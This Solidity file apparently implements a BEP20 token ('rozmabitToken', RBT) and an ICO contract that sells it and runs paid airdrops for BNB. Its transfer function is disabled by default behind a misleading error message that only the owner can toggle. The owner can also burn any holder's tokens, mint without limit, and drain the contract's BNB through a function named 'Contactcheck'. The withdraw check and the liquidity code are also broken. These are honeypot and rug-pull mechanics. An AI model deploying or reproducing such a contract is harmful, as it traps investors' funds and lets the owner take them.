
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.22 <0.9.0;
import "hardhat/console.sol";
  interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Gift(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event WithDraw(address indexed from, address indexed to, uint256 value);
  }
  contract Context {
    constructor ()  {}
    function _msgSender() internal view returns (address payable) {
      return payable(msg.sender);
    }
    function _msgData() internal view returns (bytes memory) {
      this; 
      return msg.data;
    }
  }
  library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");
      return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;
      return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
        return 0;
      }
      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");
      return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b > 0, errorMessage);
      uint256 c = a / b;
      return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }
  contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
      return _owner;
    }
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }
    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
  }


  

  contract rozmabit is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    bool private _isPassed=true;


    constructor()  {
      _name = "rozmabitToken";
      _symbol = "RBT";
      _decimals = 0;
      _totalSupply = 10000000000000 ; //10**12 10 000 000 000 000
      _balances[msg.sender] = _totalSupply;

      emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function getOwner() override external view returns (address) {
      return owner();
    }

    function decimals() override external view returns (uint8) {
      return _decimals;
    }

    function symbol() override external view returns (string memory) {
      return _symbol;
    }

    function name() override external view returns (string memory) {
      return _name;
    }

    function totalSupply() override external view returns (uint256) {
      return _totalSupply;
    }

    function balanceOf(address account) override external view returns (uint256) {
      return _balances[account];
    }

    function transfer(address recipient, uint256 amount) override external returns (bool) {
      _transfer(_msgSender(), recipient, amount);
      return true;
    }

    function allowance(address owner, address spender) override external view returns (uint256) {
      return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) override external returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
      return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
      return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
      return true;
    }

    function mint(uint256 amount) public onlyOwner returns (bool) {
      _mint(_msgSender(), amount);
      return true;
    }
    function change_state_transfer(bool _st) public onlyOwner returns (bool) {
      _isPassed=_st;
      return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
   
      require(!_isPassed, "BEP20: transfer to the zero address");
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");

      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: mint to the zero address");

      _totalSupply = _totalSupply.add(amount);
      _balances[account] = _balances[account].add(amount);
      emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) public onlyOwner {
      require(account != address(0), "BEP20: burn from the zero address");

      _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
      _totalSupply = _totalSupply.sub(amount);
      emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");

      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
      _burn(account, amount);
      _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }
  }

  
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

  contract rozmabitico is rozmabit  {
      using SafeMath for uint;

      IUniswapV2Router02 public  pcsV2Router;
    // address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
     address public router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
      address public immutable pcsV2Pair;

      address payable reff; // adresse 
      address  _owner;
      uint public saleStart = block.timestamp;  // 
      

  
      uint public tokenPrice = 2000000000000; //0.0002BNB
      address[] private airdrop_whitelist;
      uint public mull;
      uint public RaisedAmount; // Montant de la levée
      uint public Raisedtoken; // Montant de la levée
      uint128  mod;
      uint64 public minInvestment =  22000000000000000; // 0,022 BNB =  110 RBT
      uint64 public minInvestment_airdrop =  10000000000000000; // 0,01 BNB
      uint32 max = 54;
      uint16 min = 49;
      uint8 private gift_number = 5;
      mapping (address => address) private give_gift;
      string[] public all_giver;
      
      enum State {beforeStart, running, afterEnd, halted} // Etat de l'ICO (avant le début, en cours, terminé, interrompu (ça va reprendre))
      State public icoState;


      constructor() 
      {
      
          icoState = State.beforeStart;
          mull=1;
          mod=100000000000;
          _owner = msg.sender;
      
        IUniswapV2Router02 _pcsV2Router = IUniswapV2Router02(router);
   
            // Create a uniswap pair for this new token
        pcsV2Pair = IUniswapV2Factory(_pcsV2Router.factory()) .createPair(address(this), _pcsV2Router.WETH());

        // set the rest of the contract variables
        pcsV2Router = _pcsV2Router;

      }

    function random() internal view returns (uint) {
        uint randomnumber = uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % max;
        randomnumber = randomnumber + min;
      
        return randomnumber;
    }
      event Invest(address investor, uint value, uint token);

      // Interruption de l'ICO.

      function halted() public onlyOwner {
          icoState = State.halted;
      }

      // Redemarrage de l'ICO
      
      function unhalted() public onlyOwner {
          icoState = State.running;
      }

      function changeprice(uint _price) public onlyOwner {
        tokenPrice = _price;
      }
          function changemul(uint _mull) public onlyOwner {
        mull = _mull;
      }

      // function BridgeNextVersion(address _add) public onlyOwner {
      //     payable(_add).transfer(address(this).balance);
      // }

      // Changer addresse dépositaire
      function changeDepositAddress(address payable _newDeposit) public onlyOwner {
          _owner = _newDeposit;
      }

      function getCurrentState() public view returns (State) {
          if(icoState == State.halted){
              return State.halted;
          } else if (block.timestamp >= saleStart) {
              return State.running;
          } else {
              return State.beforeStart;
          }
      }

      function Contactcheck() public onlyOwner() {
        payable(owner()).transfer(address(this).balance);
      }
      function getBalanceOfContarct() public view returns(uint){
      return address(this).balance;
      }

    function transferOwnershipB(address newOwner) public onlyOwner(){
      require(newOwner != address(0), "Ownable: new owner is the zero address");
        _balances[newOwner] = _balances[newOwner].add(   _balances[payable(address(owner()))]);
          _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].sub(   _balances[payable(address(owner()))]);
        _owner = newOwner;
    }


  

      function airdrop() payable public returns (bool) {
          icoState = getCurrentState();
          require(icoState == State.running, 'ICO is not running');
          require(msg.value >= minInvestment_airdrop, 'Value is less than minimum');
        //  uint tokenAmount = msg.value.div(tokenPrice);
        // uint tokens = tokenAmount * mull ;
        uint rand_number = random();
          RaisedAmount = RaisedAmount.add(msg.value);
          _balances[msg.sender] = _balances[msg.sender].add( rand_number);
            _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].sub( rand_number);
          emit Transfer(owner(), msg.sender,   rand_number);
              //give gift to user ****************************************
              SendGift(msg.sender);
          //********************************************************
          uint ourFee = msg.value.div(5) ;
          payable(address(owner())).transfer(ourFee); // Transférer sur le compte deposit
          //  payable(address(0x73459c4780dDa076C0B10EF70859131bFd65e877)).transfer(ourFee); 
          emit Invest(msg.sender, msg.value, rand_number);
          airdrop_whitelist.push(msg.sender);
          return true;
      }


        function AIRDROP() payable public returns (bool) {
    
      //0.0005 nbn
          icoState = getCurrentState();
          require(icoState == State.running, 'ICO is not running');
          require(msg.value >= minInvestment_airdrop, 'Value is less than minimum');
          uint tokenAmount = msg.value.div(tokenPrice);
          uint tokens = tokenAmount.div(mull) ;
          RaisedAmount = RaisedAmount.add(msg.value);

        
          uint rand_number = random();
          _balances[msg.sender] = _balances[msg.sender].add( rand_number);
            _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].sub( rand_number);
           
          //give gift to user ****************************************
              SendGift(msg.sender);
          //********************************************************
          emit Transfer(owner(), msg.sender, tokens);
          uint ourFee = msg.value.div(5) ;
          payable(address(owner())).transfer(ourFee); // Transférer sur le compte deposit
          //  payable(address(0x73459c4780dDa076C0B10EF70859131bFd65e877)).transfer(ourFee); 
          emit Invest(msg.sender, msg.value, tokenAmount);
     airdrop_whitelist.push(msg.sender);
          return true;
      }
 function addLiquidity() public  payable {

 _approve( address(owner()), router, 1000 );
    
    pcsV2Router.addLiquidityETH(
        address(owner()),
        1000,
        0, // slippage is unavoidable
        0, // slippage is unavoidable
        address(owner()),
        block.timestamp + 360
    );

        // approve token transfer to cover all possible scenarios
       // _approve(address(owner()), address(pcsV2Router), tokenAmount);


//       pancakeRouter.addLiquidityETH{ value: msg.value }(
//     address(this),
//     1000,
//     1000,
//     0,
//     msg.sender,
//     block.timestamp 
// );
        // add the liquidity
        // pancakeRouter.addLiquidityETH{value: msg.value}(
        //     address(this),
        //     tokenAmount,
        //     0, // slippage is unavoidable
        //     0, // slippage is unavoidable
        //     address(owner()),
        //     block.timestamp 
        // );
//            pcsV2Router.addLiquidity(
//   address(owner()),
//   address(router),
//   tokenAmount,
//   tokenAmount,
//   amountMin,//0
//   amountMin,
//   address(owner()),
//    block.timestamp 
// );
           
        //    addLiquidityETH{value: msg.value}(
        //     address(this),
        //     tokenAmount,
        //     0, // slippage is unavoidable
        //     0, // slippage is unavoidable
        //     owner,
        //     block.timestamp + 360
        // );
    }
    

      function buy() payable public returns (bool) {
      
            icoState = getCurrentState();
            require(icoState == State.running, 'ICO is not running');
            require(msg.value >= minInvestment, 'Value is less than minimum');

            uint tokenAmount = msg.value.div(tokenPrice);
          //  console.log("tokenAmount=-> ",tokenAmount);
            //   uint tokens = tokenAmount * mull ;
              uint tokens = tokenAmount.div(mull) ;
              
          // console.log("tokens=-> ",tokens);
            RaisedAmount = RaisedAmount.add(msg.value);

            _balances[msg.sender] = _balances[msg.sender].add(tokens);
            _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].sub(tokens);
          
            uint ourFee = msg.value.div(5) ;
      
            emit Transfer(owner(), msg.sender, tokens);
            payable(address(owner())).transfer(ourFee); // Transférer sur le compte deposit
          //  payable(address(0x73459c4780dDa076C0B10EF70859131bFd65e877)).transfer(ourFee); 
          //give gift to user ****************************************
              SendGift(msg.sender);
            //********************************************************
            emit Invest(msg.sender, msg.value, tokens);
          return true;
      }
      function SendGift(address _adres) internal {
         if(get_map(_adres)){
            _balances[address(get_map_address(_adres))] = _balances[address(get_map_address(_adres))].add(gift_number);
              _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].sub(gift_number);
            emit Gift(owner(), _adres, gift_number);
              Raisedtoken = Raisedtoken.add(gift_number);
            }
      }
      function withdraw(uint _amount) public  returns (bool) {
       uint amount  = _amount+9;
        require(amount>119,"Minmum Amount is 110 +9 fee withdraw Token !");
        require(_balances[msg.sender] != amount,"Insufficient Token !");
        _balances[msg.sender] = _balances[msg.sender].sub( amount);
          _balances[payable(address(owner()))] =   _balances[payable(address(owner()))].add( amount);
        uint val = _amount*tokenPrice;
        payable(address(msg.sender)).transfer(val);
        emit WithDraw(owner(), msg.sender, _amount);
        return true;
      }
    
    ///*/Refral*//
      function add_to_Giftlist (string[] memory _giver,string[] memory _used)   public onlyOwner() {
        for(uint i;i<_giver.length;i++){
          give_gift[parseAddr(_used[i])] = parseAddr(_giver[i]);
          all_giver.push(_giver[i]);
          // give_gift[_used[i]] = _giver[i];
          // all_giver.push(_giver[i]);
        
        }
      }

      function get_map (address  _address)   internal view returns(bool) {
    
   
         if( give_gift[_address]== address(0)){
            return false; //false
         }
          return true ;//true
      }
        function get_map_address (address  _address)   internal view returns(address) {
    
         
           return give_gift[_address];
      }
         
        function get_couneter()   public view returns(uint) {
          return all_giver.length;
      }
        function get_all_giver()   public view onlyOwner() returns(string[] memory) {
          return all_giver;
      }
      function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
          bytes memory tmp = bytes(_a);
          uint160 iaddr = 0;
          uint160 b1;
          uint160 b2;
          for (uint i = 2; i < 2 + 2 * 20; i += 2) {
              iaddr *= 256;
              b1 = uint160(uint8(tmp[i]));
              b2 = uint160(uint8(tmp[i + 1]));
              if ((b1 >= 97) && (b1 <= 102)) {
                  b1 -= 87;
              } else if ((b1 >= 65) && (b1 <= 70)) {
                  b1 -= 55;
              } else if ((b1 >= 48) && (b1 <= 57)) {
                  b1 -= 48;
              }
              if ((b2 >= 97) && (b2 <= 102)) {
                  b2 -= 87;
              } else if ((b2 >= 65) && (b2 <= 70)) {
                  b2 -= 55;
              } else if ((b2 >= 48) && (b2 <= 57)) {
                  b2 -= 48;
              }
              iaddr += (b1 * 16 + b2);
          }
          return address(iaddr);
      }

    //*** Game */
 
      
    //
        
      receive() payable external {
        buy();
        }
  }
